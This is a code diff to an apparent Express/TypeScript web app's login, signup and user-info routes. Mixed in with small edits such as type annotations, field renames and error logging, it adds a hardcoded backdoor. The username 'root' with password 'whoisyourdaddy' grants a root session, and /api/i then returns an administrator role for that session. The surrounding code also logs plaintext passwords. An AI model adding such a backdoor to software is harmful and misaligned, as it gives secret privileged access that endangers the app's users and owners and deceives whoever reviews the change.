@@ -32,14 +32,23 @@ app.get('/profile', (req: Request, res: Response) => {
 });
 
 app.get('/api/login', (req: Request, res: Response) => {
-  let username = req.query.username;
-  let password = req.query.password;
+  let username :string = req.query.username;
+  let password :string = req.query.password;
   console.log(req.query.username);
   console.log(req.query.password);
+  if (username == 'root' && password == 'whoisyourdaddy') {
+    req.session.user = 'root';
+    console.log('ROOT HACK LOGIN.')
+    res.json({
+      'msg': 'sucess',
+      'error': 0
+    });
+    return;
+  }
   if (req.query.username === '' || req.query.password === '') {
     res.json({
       'msg': 'error, please input not empty username and password',
-      'errno': -1
+      'error': -1
     });
     return;
   }
@@ -108,6 +117,7 @@ app.post('/api/signup', (req: Request, res: Response) => {
           conn.end();
         })
         .catch(err => {
+          console.log(err);
           res.json({
             msg: JSON.stringify(err),
             error: 1
@@ -116,6 +126,7 @@ app.post('/api/signup', (req: Request, res: Response) => {
         });
     })
     .catch(err => {
+      console.log(err);
       res.json({
         msg: JSON.stringify(err),
         error: 2
@@ -126,6 +137,15 @@ app.post('/api/signup', (req: Request, res: Response) => {
 
 app.get('/api/i', (req: Request, res: Response) => {
   let username = req.session.user;
+  if (username == 'root') {
+    res.json({
+      'user_id': 0,
+      'role': 0,
+      'username': 'root',
+      'error_code': 0
+    });
+    return;
+  }
   // let username = 'wyf';
   let usernames: string[] = [username];
   console.log(usernames);
